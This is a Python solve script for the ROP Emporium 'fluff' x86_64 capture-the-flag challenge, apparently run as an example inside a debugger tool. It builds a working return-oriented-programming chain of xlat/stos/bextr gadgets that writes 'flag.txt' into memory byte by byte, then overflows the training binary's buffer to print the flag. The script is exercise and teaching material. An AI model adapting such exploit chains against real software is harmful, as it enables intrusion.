"""ROP Emporium fluff on x86_64: xlat/stos byte-by-byte filename construction.

The challenge has no memory-write gadget; it provides `xlat` (AL = [RBX+AL])
and `stos` ([RDI] = AL, RDI++). The chain:

1. `pop rdi` = .bss (the write cursor)
2. normalize AL through a zeroed window at .bss+8: `pop rdx=0x4000; pop
   rcx=0x601040-0x3ef2; bextr` sets RBX, then `xlat` makes AL = 0
   regardless of the unknown puts return value
3. for each byte of "flag.txt": set RBX = (an address in .text/libc holding
   that byte) minus the previous AL via bextr, `xlat` loads the byte into
   AL, `stos` writes it and advances RDI
4. `pop rdi` = .bss; print_file@plt

The .bss page remainder is zeroed, so the NUL terminator after "flag.txt"
is already in place. No second read, one delivery.

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_fluff_x64.py
"""

from __future__ import annotations

import struct

from mydbg import symbolic

import emporium

POP_RDI = 0x4006A3        # 5f c3 (pop rdi; ret)
PRINT_FILE_PLT = 0x400510
BEXTR_POP = 0x40062A      # pop rdx; pop rcx; add rcx,0x3ef2; bextr rbx,rcx,rdx; ret
XLAT = 0x400628           # xlat (AL = [RBX+AL]); ret
STOS = 0x400639           # stos %al,(%rdi); ret
BSS = 0x601038
ZERO_WINDOW = 0x601040    # 256 zeroed bytes after .bss (verified at runtime)
CONTROL_64 = 0x4000       # bextr control: start=0, length=64 -> rbx = rcx

# Byte sources: main-image .text (static) or libfluff/libc (link_map walk).
# libc addresses are resolved at the csu_init stop.
MAIN_BYTES = {0x66: 0x400552, 0x61: 0x4005D2, 0x2E: 0x400553, 0x74: 0x40056F}
LIBC_BYTES = {0x6C: 0x2000A, 0x67: 0x2008F, 0x78: 0x20123}  # libc offsets


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    binary = emporium.challenge_path("x64", "fluff")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001

    process = emporium.qemu_connect(dbg, "x64", binary)  # no payload yet
    csu_init = symbolic.resolve_project_symbol(project, "__libc_csu_init")
    dbg.set_breakpoint(f"{csu_init:#x}")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped":
        raise RuntimeError("csu_init stop missed")
    libc_base = emporium.library_base_via_link_map(dbg, "libc")
    print(f"[+] libc base: {libc_base:#x}")

    # Verify the zero window (the normalize xlat relies on it).
    window = dbg.read_memory(ZERO_WINDOW, 0x100)
    if window != bytes(0x100):
        raise RuntimeError("the zero window after .bss is not zeroed")
    print("[+] zero window at .bss+8 verified")

    sources = dict(MAIN_BYTES)
    for value, offset in LIBC_BYTES.items():
        sources[value] = libc_base + offset

    def set_rbx(value: int) -> bytes:
        # bextr gadget: rbx = (rcx = value - 0x3ef2) extracted with control
        # 0x4000 (start 0, length 64).
        return (struct.pack("<Q", BEXTR_POP) +
                struct.pack("<Q", CONTROL_64) +
                struct.pack("<Q", (value - 0x3EF2) % (1 << 64)))

    chain = (struct.pack("<Q", POP_RDI) + struct.pack("<Q", BSS))
    # Normalize AL: xlat through the zero window gives AL = 0.
    chain += set_rbx(ZERO_WINDOW) + struct.pack("<Q", XLAT)

    al = 0
    flag = b"flag.txt"
    for byte in flag:
        addr = sources[byte]
        chain += set_rbx(addr - al) + struct.pack("<Q", XLAT)
        chain += struct.pack("<Q", STOS)
        al = byte
    chain += (struct.pack("<Q", POP_RDI) + struct.pack("<Q", BSS) +
              struct.pack("<Q", PRINT_FILE_PLT))

    payload = b"A" * 40 + chain
    print(f"[+] chain {len(chain)} bytes, payload {len(payload)} bytes")

    for bp in dbg.list_breakpoints():
        if f"{csu_init:#x}" in bp.description:
            dbg.remove_breakpoint(bp.id)
    process.send(payload, timeout=10)
    result = dbg.continue_and_wait(timeout=30)
    output = emporium.drain(process, seconds=6.0)
    lines = output.decode(errors="replace").splitlines()
    printed = [line for line in lines if "ROPE{" in line]
    if not printed:
        raise RuntimeError(f"fluff chain failed: {output[-200:]!r}")
    print("[+] fluff-x64-solve-ok:", printed[-1])
